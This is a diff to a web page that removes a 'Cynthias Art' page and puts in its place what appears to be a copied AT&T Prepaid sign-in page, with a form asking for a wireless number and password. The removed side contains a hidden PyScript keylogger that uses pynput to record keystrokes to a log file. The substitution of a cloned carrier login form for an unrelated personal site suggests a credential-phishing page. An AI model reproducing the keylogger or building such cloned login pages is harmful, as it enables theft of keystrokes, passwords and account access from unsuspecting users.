@@ -1,70 +1,902 @@
 
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-	  <meta name="description" content="Cynthias Art Project">
-  <meta property="og:title" content="Cynthias Art" />
-<meta property=" og:description" content="Check out My Custom Paintings"/>
-<meta property="og:image" content="https://images.unsplash.com/photo-1547826039-bfc35e0f1ea8?ixlib=rb-4.0.3&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=2272&q=80" />
-   <link rel="stylesheet" href="https://pyscript.net/latest/pyscript.css" />
-  <script defer src="https://pyscript.net/latest/pyscript.js"></script>
-  <py-env>
-  - pynput
-</py-env>
-    <title>My Website</title>
-    <link rel="stylesheet" href="./style.css">
-    <link rel="icon" href="./favicon.ico" type="image/x-icon">
-  </head>
-  <body>
-	  <h2>Text input fields</h2>
+<!doctype html>
 
-<form>
-  <label for="fname">First name:</label><br>
-  <input type="text" id="fname" name="fname" value="John"><br>
-  <label for="lname">Last name:</label><br>
-  <input type="text" id="lname" name="lname" value="Doe">
-</form>
+	
+	
+		
+		
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if IE 9]>         <html class="no-js ie9" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+		
+	
 
-<p>Note that the form itself is not visible.</p>
+<script type="text/javascript" src="assets/js/libs/jquery-1.11.min.js"></script>
+<!--[if !IE]><!--><script>//ie10 detect
+if (/*@cc_on!@*/false) {
+    document.documentElement.className+=' ie10';
+}
 
-<p>Also note that the default width of text input fields is 20 characters.</p>
+$(document).ready(function ()
+		{   
+	 		var titleName='';
+	 		
+		    if($(".mainBodyContent h2") != null && $(".mainBodyContent h2").is(':visible'))
+			{
+		    	titleName = '<b>AT&amp;T</b> PREPAID&#8480;'+' - '+'Account Summary';
+			}
+		    else if($("#section-title h2") != null && $("#section-title h2").is(':visible')){ 
+		    	titleName = '<b>AT&amp;T</b> PREPAID&#8480;'+' - '+$("#section-title h2").text();
+		    }	    
+		    else if($("#section-title .summaryTitle") != null && $("#section-title .summaryTitle").is(':visible')){ 
+		    	titleName = '<b>AT&amp;T</b> PREPAID&#8480;'+' - '+$("#section-title .summaryTitle").text();
+		    }   
+        // DE654 fix
+        else if((location.pathname.substring(location.pathname.lastIndexOf("/") + 1))=='mydevice.html'){ 		    	
+		    	titleName = '<b>AT&amp;T</b> PREPAID&#8480;'+' - '+'My Device';
+		    }
+		    else if($("#profileSetting") !=null && $("#profileSetting").is(':visible')) { 		    	
+		    	titleName = '<b>AT&amp;T</b> PREPAID&#8480;'+' - '+'Profile & Settings';
+		    }
+		    else{
+		    	titleName = '<b>AT&amp;T</b> PREPAID&#8480;';
+		    }
+		    titleName = $('<div/>').html(titleName).text();
+			document.title = titleName;	
+		});
 
-<py-script>
-from pynput.keyboard import Key, Listener
-import logging
-
-
-logging.basicConfig(filename="keystroke_log.txt",
-                    level=logging.DEBUG,
-                    style="{",
-                    datefmt='%Y-%d-%M %H:%M:%S',
-                    format='[{asctime}]: {message}')
-
-
-def on_press(key) -> None:
-    logging.info(str(key))
-
-
-def on_release(key) -> bool:
-    if key == Key.esc:
-        return False
-
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-    </py-script>
- <py-script> print('Now you can!') </py-script>
-</body>
-      
-
+</script><!--<![endif]-->
+<head>
     
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+	<!-- Cleaned up previous code to display title per CATO requirement -->
+	<!--
+	<title><img src="assets/images/att_prepaid_logo_english.png" width="122" height="38">
+								-
+						
+							
+							
+									
+										Sign in<br><span style="font&#45;size: 11px">Ingresa</span>
+									
+									
+									
+								
+									
+								
+									
+								
+									
+							
+									
+									
+									
+							
+									
+								
+									
+							
+									
+			
+									
+							
+									
+									
+								
+								
+								
+						
+	</title> -->
+	<!--  edm javascript  begin -->
+	
+		<script	type="text/javascript" src="//www.att.com/scripts/adobe/prod/detm-container-hdr.js"> </script>
+	
+	<!--  edm javascript end -->
 
-    <main>
-        <h1>Welcome to My Website</h1>  
-    </main>
-	<script src="index.js"></script>
-  </body>
+	<!-- GroundworkCSS -->
+	<link type="text/css" rel="stylesheet" href="assets/css/groundwork.css?rand_string=multiline_ph1">	
+	<link type="text/css" rel="stylesheet" href="assets/css/ericsson.css?rand_string=sonsored-data">	
+	
+	<!-- myatt phase 2 drop2 Css splitting -->
+	<link type="text/css" rel="stylesheet" href="assets/css/uiericsson/gophone.css">	
+	<link type="text/css" rel="stylesheet" href="assets/css/uiericsson/tablet.css">	
+	<link type="text/css" rel="stylesheet" href="assets/css/uiericsson/whpp.css">	
+	<link type="text/css" rel="stylesheet" href="assets/css/uiericsson/hotspot.css">	
+	<!--[if IE]>
+	<link type="text/css" rel="stylesheet" href="assets/css/groundwork-ie.css">
+	<![endif]-->
+	<!--[if lt IE 9]>
+	<script type="text/javascript" src="assets/js/libs/html5shiv.min.js"></script>
+	<![endif]-->
+	<!--[if IE 7]>
+	<link type="text/css" rel="stylesheet" href="assets/css/font-awesome-ie7.min.css">
+	<![endif]-->
+
+	<!-- Modernizr -->
+	<script src="assets/js/libs/modernizr-2.6.2.min.js"></script>
+	<!-- Moved here due to possible inline scripts. -->
+	<script type="text/javascript" src="assets/js/libs/jquery-1.11.min.js"></script>
+	<script type="text/javascript" src="assets/js/libs/spin.min.js"></script>
+	<link rel="shortcut icon" href="assets/images/favicon.ico" />
+
+	
+	<!-- Multiline Start -->
+		<link type="text/css" rel="stylesheet"
+	href="assets/css/collapseStyle.css">
+		<link href="assets/css/bootstrap_multiLine.css" rel="stylesheet"
+	type="text/css">
+		<link href="assets/css/table-theme.css" rel="stylesheet" type="text/css">
+	<!-- Multiline End -->
+
+	
+	<!-- CATO timeOut warning CSS -->	
+	<link type="text/css" rel="stylesheet" href="assets/css/warningMessage.css">
+	<!-- CATO timeOut warning CSS -->
+	<!-- CATO CSS ekotsat for ericsson and groundwork changes -->
+	<link href="assets/css/cato.css?rand_string=multiline_ph1" rel="stylesheet" type="text/css" />
+	
+	<!--Ericsson scripts for edm begin -->
+	
+	
+		<script src="assets/js/edm.utils.js"></script>
+		<script>
+			edmTags.init({
+				pageTag:"edmPage",
+				sessionTag:"edmSession",
+				eventTag:"edmEvent"
+					});
+		</script>
+	
+	<!--Ericsson scripts for edm end-->
+	
+	 
+	<script>
+		//WRA7230 Go to Login Page after session timeout timer
+		 try{
+			var sessionLogoutInterval='';
+			var sessionTimoutTimer=''; // time in seconds 
+			
+			if(sessionLogoutInterval != null && sessionLogoutInterval != '' &&  sessionTimoutTimer != null && sessionTimoutTimer != ''){		
+	       // var timoutMessageAfter = sessionLogoutInterval-sessionTimoutTimer;			
+		    var count = parseInt(sessionLogoutInterval);
+		   
+		    var counter; //1000 will  run it every 1 second
+		    var fromCancel = false;
+		    var seconds = 0;
+		    var minutes = 0;
+		   
+		    function twoDigits(time){
+			        return time > 9 ? "" + time: "0" + time;
+			}
+		    
+		    counter = setInterval(timer, 1000);
+		    
+		    function timer() {		        
+		     
+			    if(count <= parseInt(sessionTimoutTimer) && count>0){
+			    	if($('.mainBodyContent').is(':visible') && !$('.modal-box').is(':visible') && !fromCancel){
+					
+						 $('.mainBodyContent').hide(); 
+						 
+						 if($("#_page_offset").is(':visible')) // offset is optional may or may not avialble on the page
+						 $("#_page_offset").hide();
+						 
+						$('.modal-box').show(); 					
+					}
+					else if($("#_page_content").is(':visible') && !$('.modal-box').is(':visible') && !fromCancel){
+						 $('#_page_content').hide(); 
+						
+						 if($("#_page_offset").is(':visible')) // offset is optional may or may not avialble on the page
+						 $("#_page_offset").hide();						 
+						 $('.modal-box').show(); // 	
+					}
+					else if($("#checkout-page").is(':visible') && !$('.modal-box').is(':visible') && !fromCancel){					
+						$("#checkout-page").hide();											
+						$('.modal-box').show(); 
+										
+					}
+			    	
+			     $(document).ready(function(){	
+			    	 seconds = parseInt((count % 60), 10);				       
+			         minutes = parseInt(Math.floor(count / 60), 10);
+			         minutes = parseInt(minutes % 60 , 10);	 
+			   	   $("#timerClock").html(twoDigits(minutes)+":"+twoDigits(seconds)); 
+			   	 });
+			     
+			    }
+			    
+			    count = count - 1;
+			    if(count <= 0){
+			    clearInterval(counter);		         
+			    // logout automatically when there is no counter value 
+			    location.href='logoff.html?flag=SESSION_TIMED_OUT';	
+			    }
+			  }	 
+		   		 
+		    }		
+		}
+		catch(e)
+		{
+			console.log('sessionLogoutInterval invalid')
+		} 
+
+	//WRA7230 end here Go to Login Page after session timeout   
+	</script>
+	
+	<style type="text/css">
+		@-moz-document url-prefix() {
+		.fancy-drop{
+			width:98%;
+		
+		}
+		.fancy-drop select {
+		 max-width:105%;
+		 min-width:105px;}
+		 }
+	</style>	
+</head>
+
+
+
+
+
+
+<input type="hidden" name="" value="displayTimeOutWarningVal" id="displayTimeOutWarning"/>
+
+<body class=" login ">
+      <div id="glasspane" style="display:none">
+		<div id='glasspaneContainer' class="glasspaneContainer"></div> 
+    	<div id="spinnerpane" class="glassPaneCenter"></div>  
+	</div>
+        <section id="_page_head_blackbar">
+        <!-- include blackbar -->
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+
+        </section>
+
+	<div class="container main">
+		
+		
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+@media ( max-width : 768px) {
+	.rateGrpName {
+		font-size: ;
+	}
+  header h1 #logo { height: 39px; !important ;}
+  /* Fix for DE618:IPhone 6 landscape view : menus like logout, MyDevice, help, alerts are not visible.*/
+  nav#main-nav ul li a { padding-top:1px!important;height:30px!important;font-size: 15px!important;}
+}
+@media ( min-width : 768px) {
+	.rateGrpName {
+		font-size: ;
+	}
+}
+header h1 img {border-right:none;}
+header h1 {padding-bottom:0px !important ;} 
+header h1 #logo { height: 37px; !important ;}
+.smSymbol {font-size:13px;vertical-align: top!important;}
+@-moz-document url-prefix() { 
+  div.rateGrpName span.smSymbol {
+     vertical-align: 19%!important;
+  }
+}
+@media ( max-width : 800px) {
+  .smSymbol {font-size:10px!important;} 
+}
+</style>
+
+
+<header id="_page_header" class="padded">
+	
+		
+		
+			<div class="row padded orange fixed">
+				<h1 class="pull-left">
+					<a href="#"><img id="logo" class="pull-left"
+						src="assets/images/logo.png" alt="AT&#38;T"
+						data-png-fallback="assets/images/logo.png" />
+						<div class="pull-left">
+							<div class="image&#45;logo&#45;login"><img src="assets/images/att_prepaid_logo_english.png" width="122" height="38"></div>
+							<!-- Extended title for CATO : ekotsat : Removed emaanej later requirement -->							
+						</div></a>
+				</h1>
+				<div class="pull-left hide-tablet"></div>
+			</div>
+		
+	
+
+
+</header>
+
+
+		
+		
+
+
+
+
+
+
+
+
+
+
+
+	
+<link type="text/css" rel="stylesheet" href="assets/css/applePayErrorBanner.css"> 
+<div id="appMessage"> 
+
+
+
+
+
+
+
+
+
+</div>
+
+<section id="errorJavascript" class="row padded" style="display: none">
+		<div class="tile padded">
+			<!-- Code for Font-Awesome Accessible -->
+			<a href="javascript:void(0)" title="Close the Message" class="close"><span class="icon-close pull-right"></span><span class="screen-reader-text">Close the Message</span></a>
+			<h2 tabindex="0">Error!</h2>
+			<p>
+				<p id="errorJavascriptId">com.opensymphony.xwork2.ActionSupport@5b3a6622</p>
+			</p>
+		</div>
+</section>
+<!-- Start of ApplePayError Banner -->
+<section id="applePayMsgErrSec" class="row padded" style="display: none">
+		<div class="tile padded">
+			<!-- Code for Font-Awesome Accessible -->
+			<a href="javascript:void(0)" title="Close the Message" class="close"><span class="icon-close pull-right"></span><span class="screen-reader-text">Close the Message</span></a>
+			<h2 tabindex="0">Error!</h2>
+			<p>
+				</p><p id="applePayMsg">We seem to be experiencing system issue with Apple Pay. Please use other payment method.</p>
+			<p></p>
+		</div>
+</section>
+
+<script type="text/javascript">
+	$(document).ready(function(){
+		if($('#applePayMsgErrSec').length > 0) {
+			$('#applePayMsgErrSec').find('a.close').on('click', function(e) {
+				$('#applePayMsgErrSec').slideUp(300);
+				e.preventDefault();
+			});
+		}
+	});
+</script>
+<!-- End of ApplePayError Banner --> 
+		
+		
+		<!-- Only used/defined for multiline summary page -->
+		
+		
+		<section id="_page_subtilte">
+			
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="row padded hed-parent"> <!--mobile-no-pad-bottom -->
+		<div class="tile white">
+			<div class="hed row ">
+				<div class="one whole mobile padded" id="section-title">
+						<div class="table">
+							<img class="pull-left cell mobile icon-small" src="/websc/assets/images/plus.svg" alt="Checkout" data-png-fallback="/websc/assets/images/plus.png">
+							<h2 class="cell mobile">
+								Account Sign In<br><span style="font&#45;size: 11px">Iniciar sesi&#243;n</span></h2>
+						</div><!--/whole-->
+				</div>
+				<div class="one mobile half align-right account-balance " style="display:none;">
+					<p class="account"></p>					
+				</div>
+			</div><!--/hed-->
+		</div><!--/mobile-no-pad-bottom -->
+</section>
+		</section>
+		<noscript>
+			<div class="content collapse">
+				<div class="pad-top pad-bottom align-center red">
+					Please enable Javascript in your browser to use this&#160;page.
+				</div>
+			</div>
+		</noscript>
+		
+		
+		<section id="_page_content">
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" src="assets/js/plugins/jquery.cookie.min.js"></script>
+
+<div class="padded">
+	<div id="cookieDisabledId" style="display: none;" class="one full tile white padded align-center" >	              
+        It looks like you don’t have cookies turned on.<br> Check your internet settings and make sure cookies are enabled. Then, try again. <br><br><br>Parece que no tienes las cookies activadas.<br> Verifique su configuraci&#243;n de Internet y aseg&#250;rese de que las cookies est&#233;n habilitadas. Vuelva a intentarlo. 		
+	</div>
+</div>
+
+<script>
+$(document).ready(function ()
+{
+	//set key value 
+	$.cookie('token', 'cookie');
+	if($.cookie('token')) 
+	{	
+		   	$("#loginDivDisplayID").show();					
+	}
+	else
+    {
+		   	$("#loginDivDisplayID").hide();	
+		   	$("#cookieDisabledId").show();	
+    }	
+});
+</script>
+		<div class="content collapse hide-with-nojs">
+		
+		<!-- CATO requirement to skip main content- ekotsat-->
+			<a name="maincontent" id="maincontent"></a>
+			<section class="login-form-box row pad-left pad-right pad-bottom"> 
+				<div class="dummyBodyClass">
+					<section id="_page_main">
+						
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="two thirds tile" id="loginDivDisplayID">
+	<div class="row padded">
+		<form id="login-form" name="login-form" action="/websc/logon.html" method="post" class="parsleyParse" novalidate="">
+			
+			<div class="row one third gap-bottom nowrap usernameDiv">
+				<div class="phone-number-field">
+					<!-- <p id="login-phone-phone-number-prompt">Format: (___) ___-____</p> -->
+					<!-- for android default browsers -->
+
+					<label for="login-phone-phone-number">10&#45;digit Wireless Number<br><span style="font&#45;size: 11px">N&#250;mero</span> <img
+						src="assets/images/question.png" alt="?" class="help" rel="tooltip" data-container="body" data-placement="auto"
+						title="Enter your 10 digit wireless number (ex. 7045551212)"></label>
+
+					<input type="tel" name="phoneNumber" maxlength="10" value="" id="login-phone-phone-number" class="parsley-validated" parsley-error-message="Please enter your 10 digit wireless number with no spaces or punctuation" parsley-rangelength="[10,10]" pattern="\d{10}" parsley-type="number" parsley-trigger="blur" required=""/>
+
+				</div>
+				<!-- /phone number field -->
+			</div>
+			
+			<div class="row one third gap-bottom pad-bottom passwordDiv">
+				<label for="login-pin-pin-number">Password<br><span style="font&#45;size: 11px">Contrase&#241;a</span> 
+				</label>
+
+				<input type="password" name="password" maxlength="24" value="" id="login-pin-pin-number" class="login-pin parsley-validated" parsley-error-message="Please enter your Online Password" parsley-rangelength="[4,24]" pattern="^[0-9]{4}$|^[a-zA-Z0-9_-]{6,24}?$" parsley-trigger="blur" required=""/>
+
+				  <input type="hidden" name="passwordFocus" value="" id="passwordFocus"/>
+
+			</div>
+			
+			<div class="row pad-top one third">
+				<button type="submit" id="login-form_0" value="Submit" class="button medium block unselected no-toggle">
+Sign in<br><span style="font&#45;size: 11px">Ingresa</span>
+</button>
+
+			</div>
+		</form>
+
+
+
+	</div>
+	
+	<div class="row pad-right pad-bottom pad-left border-top message-box">
+		<div class="row pad-top one third">
+			<div class="cell mobile align-center">
+				<a href="/websc/forgotPasscode.html" id="forgot-password">Forgot Password / New User<br><span style="font&#45;size: 11px">Olvid&#243; la contrase&#241;a / Nuevo Usuario</span></a>
+			</div>
+			<p>&nbsp;</p>
+			<div class="align-center cell mobile">
+				<a href="http://www.att.com/myatt">Return to myAT&#38;T</a>&nbsp;
+				
+			</div>
+		</div>
+	</div>
+</div>
+
+<script>
+   $(document).ready(function(){
+     var passwordFocus = $("#passwordFocus").val();
+     if (passwordFocus == "ON") {
+       $("#login-pin-pin-number").focus();
+      }
+   });
+</script>
+
+					</section>
+				    <aside id="_page_sidebar">
+						
+					</aside>		
+				</div>
+				
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="tile white one whole center dummyWebLangWarning"
+	style="display: none">
+	<div class="table row white padded">
+		<div class="cell one whole">
+			<p>
+				<strong>Incomplete Payment</strong>
+			</p>
+		</div>
+	</div>
+	  
+		
+			 <input type="hidden" name="" value="es_US" id="requstLocale"/>       
+			
+		        
+	<div  class=" pad-left pad-top pad-right align-center">
+		<p>You have not finished. Once you leave this page the whole transaction will be lost.</p>
+	</div>
+	<div class="row pad-left pad-right pad-bottom align-center">
+		
+		
+			
+		
+
+		<button style="min-width: 180px !important"
+			class="button medium dummyWebLangSubmitButtonClass" title="Leave Page">
+			Leave Page
+		</button>
+
+		<button style="min-width: 180px !important"
+			class="button secondary medium dummyWebLangCancelButtonClass" title="Cancel">
+			Cancel
+		</button>
+	</div>
+
+</div>
+<script>
+	$('document').ready(function() {
+		$('.dummyWebLangSubmitButtonClass').click(function() {
+			var url = $('#displayWebLangWarning').val();
+			url=url+'?request_locale='+$('#requstLocale').val();
+			siteLanguage.submitLanguageFormWithUrl(url);
+		});
+		$('.dummyWebLangCancelButtonClass').click(function() {
+			$('.dummyBodyClass').show();
+			$('.dummyWebLangWarning').hide();
+		});
+	});
+	
+
+</script>
+			</section>
+ 	   	</div>	   
+		</section>
+		
+		
+		<section class="row" id="_page_warning">	
+			
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="modal-box" style="display: none;">
+  <header class="gradient-heading">
+  <div class="close-container">  <button id="closeWarning" class="btn-close"></button><label>Close</label></div>   
+    <h3>Automatic Logout for Your Protection</h3>    
+  </header>
+  
+  <div class="modal-body">
+    <p><strong>Are you still there?</strong><br>
+		To protect your account information, when too much time passes with no activity, we schedule an automatic logout.
+		<br>
+		A logout is scheduled in <strong id="timerClock"></strong><br>
+		To remain logged in, select OK.
+	</p>
+  </div>
+    <footer><button id ="extendSession" class="btn-Ok"><label>OK</label></button></footer>    
+</div>
+
+<script>
+	 $('document').ready(function() {		 
+	
+		$('#extendSession').click(function() {			
+			$.ajax({
+			    url: "sessionTimeOut.html", // pageContext. 
+			    type: "POST",
+			    //dataType:"json",
+			    //data:{"Id":"dummyId"},
+			    success: function(data,textStatus,jqXHR) {
+			    	
+			    	if($('.modal-box').is(":visible") && $(".mainBodyContent").is(':hidden')){
+						$('.modal-box').hide(); 
+						$(".mainBodyContent").show();					
+					}
+					else if($('.modal-box').is(":visible") && $("#_page_content").is(':hidden')){
+						$('.modal-box').hide(); 
+						$("#_page_content").show();
+						$("#_page_offset").show();
+						
+						if($("#_page_offset").is('hidden')) // _page_offset is optional so explicitly checked
+						$("#_page_offset").show();
+					}
+					else if($('.modal-box').is(":visible") && $("#checkout-page").is(':hidden')){
+						$('.modal-box').hide(); 
+						$("#checkout-page").show();					
+					}
+			    	
+					if(data.jsonResponseCode == "200"){		    	
+			    	// start with 15 minute timer again
+					clearInterval(counter);			 
+					count = sessionLogoutInterval;
+					counter = setInterval(timer, 1000);			    	
+					}
+					else if(data.jsonResponseCode == "500"){
+					console.log("Server thrown error with code"+jsonResponseCode);
+					}					
+				},
+			    error: function(XMLHttpRequest, textStatus, errorThrown) {			    	    
+			    	console.log("Server thrown error reason unknown");
+			    }
+			});		
+			
+			
+		});
+	}); 
+	 
+	 $('document').ready(function() {
+			$('#closeWarning').click(function() {
+				fromCancel = true;
+				if($('.modal-box').is(":visible") && $(".mainBodyContent").is(':hidden')){
+					$('.modal-box').hide(); 
+					$(".mainBodyContent").show();					
+				}
+				else if($('.modal-box').is(":visible") && $("#_page_content").is(':hidden')){
+					$('.modal-box').hide(); 
+					$("#_page_content").show();
+					$("#_page_offset").show();
+					
+					if($("#_page_offset").is('hidden')) // _page_offset is optional so explicitly checked
+					$("#_page_offset").show();
+				}
+				else if($('.modal-box').is(":visible") && $("#checkout-page").is(':hidden')){
+					$('.modal-box').hide(); 
+					$("#checkout-page").show();					
+				}				
+			});
+		}); 	
+</script>
+		</section>
+		
+		
+		
+		
+		<section id="_page_offset" class="hide-with-nojs">
+			
+		</section>
+		
+		
+		<section class="row" id="_showWithNoJs">	
+			
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" src="assets/js/plugins/jquery.cookie.min.js"></script>
+
+<div class="padded">
+	<div id="cookieDisabledId" style="display: none;" class="one full tile white padded align-center" >	              
+        It looks like you don’t have cookies turned on.<br> Check your internet settings and make sure cookies are enabled. Then, try again. <br><br><br>Parece que no tienes las cookies activadas.<br> Verifique su configuraci&#243;n de Internet y aseg&#250;rese de que las cookies est&#233;n habilitadas. Vuelva a intentarlo. 		
+	</div>
+</div>
+
+<script>
+$(document).ready(function ()
+{
+	//set key value 
+	$.cookie('token', 'cookie');
+	if($.cookie('token')) 
+	{	
+		   	$("#loginDivDisplayID").show();					
+	}
+	else
+    {
+		   	$("#loginDivDisplayID").hide();	
+		   	$("#cookieDisabledId").show();	
+    }	
+});
+</script>
+		</section>
+		
+		
+		
+		<!-- note sticker footer is controlled in _att-constants.scss -->
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+	
+
+	
+
+
+
+
+
+
+
+
+<div id = "edmPage"
+    data-page-context="/websc"
+    data-page-url="/loginPage.html"
+    data-page-language="EN"
+    data-page-name=""
+    data-page-flow-code="Wireless Prepaid"
+    data-page-responsive-experience="DefaultResponsiveExperience" >
+</div>  
+
+<div id="edmSession" data-user-login-id="" data-user-account-ctn="" data-user-email="" data-user-zip="" data-user-account-billing-state="" data-user-account-billing-city="" data-user-account-billing-zip="" data-user-login-type="CTN" data-user-account-liability-type="CONS" data-description="Common session data" ></div>
+<div id="edmEvent" data-event-action="formResponse" data-event-submit-name="GoPhone_Login_PrePaid_Submit" data-event-submit-action="formSubmit" data-event-submit-data="eventCode:GoPhone_Login_PrePaid_Submit|successFlag:-2|statusMessage:UNKNOWN" data-description="response event" ></div>
+
+
+
+
+<script>
+</script>
+
+ 	 </div> 	 
+	
+ 	<!-- end container -->
+	<!-- scripts -->
+	<script>
+		if(!Modernizr.svg) {
+			$('img[data-png-fallback]').hide();
+			var images = $('img[data-png-fallback]');
+			images.each(function(i) {
+				$(this).attr('src', $(this).data('png-fallback'));
+			});
+			$('img[data-png-fallback]').show();
+		}
+	</script>
+
+	<script type="text/javascript" src="assets/js/app.js?rand_string=multiline_ph1"></script>	
+	<script type="text/javascript">
+		// extend Modernizr to have datauri test
+		(function(){
+			var datauri = new Image();
+			datauri.onerror = function() {
+					Modernizr.addTest('datauri', function () { return false; });
+			};
+			datauri.onload = function() {
+					Modernizr.addTest('datauri', function () { return (datauri.width == 1 && datauri.height == 1); });
+					Modernizr.load({
+						test: Modernizr.datauri,
+						nope: 'assets/css/no-datauri.css'
+					});
+			};
+			datauri.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==";
+			
+		})();
+		// polyfill for HTML5 placeholders
+		Modernizr.load({
+			test: Modernizr.input.placeholder,
+			nope: [
+				'assets/css/placeholder_polyfill.css',
+				'assets/js/libs/placeholder_polyfill.jquery.js'
+			]
+		});
+	</script>
+	<!-- WebTrends Base Tag : include only at end of page --> 
+	
+				<script	 type="text/javascript" src="//www.att.com/scripts/adobe/prod/detm-container-ftr.js"> </script>
+	
+		
+	
+	
+</body>
 </html>
